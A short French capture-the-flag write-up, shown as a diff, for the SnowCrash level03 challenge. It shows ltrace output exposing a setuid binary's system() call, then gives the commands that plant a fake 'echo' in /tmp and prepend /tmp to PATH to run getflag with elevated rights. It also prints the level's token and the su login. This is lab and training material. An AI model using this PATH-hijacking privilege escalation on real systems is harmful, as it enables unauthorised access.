@@ -1,0 +1,35 @@
+Nous voyons dans le repertoire courant la presence d'un fichier executable level03
+-> ./level03
+Exploit me
+
+La commande strings level03 | grep Exploit nous renvoie : /usr/bin/env echo Exploit me
+
+Nous utilisons ltrace ./level03 afin d'intercepter et enregistrer les appels de bibliothèque dynamiques qui sont appelé par le processus exécuté et les signaux reçus par ce processus (copy/paste man page) : 
+
+__libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                         = 2003
+geteuid()                                         = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                            = 0
++++ exited (status 0) +++
+
+Nous remarquons qu'il y a un appelle a la fonction system. Selon la page de man la fonction system(const char *commande) exécute la commande indiquée dans commande en appelant /bin/sh -c commande.
+Ici elle execute donc /usr/bin/env echo Exploit me
+Nous allons donc devoir recoder une fonction echo afin qu'elle nous affiche le flag grace a getflag
+
+On utilise le dossier /tmp qui est le seul que nous pouvons utiliser : 
+echo "echo \$(getflag)" > /tmp/echo
+
+Le fichier a bien ete cree sans probleme, on change donc les droits d'execution avec chmod +x /tmp/echo
+
+On va changer le path pour que la premiere fonction echo trouve lors de l'appel system soit celle presente dans notre dossier /tmp : export PATH=/tmp:$path
+
+
+On execute ./level03 : Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+su level04 Password: qi0maab88jeaj46qoumi7maus
+level04@SnowCrash:~$
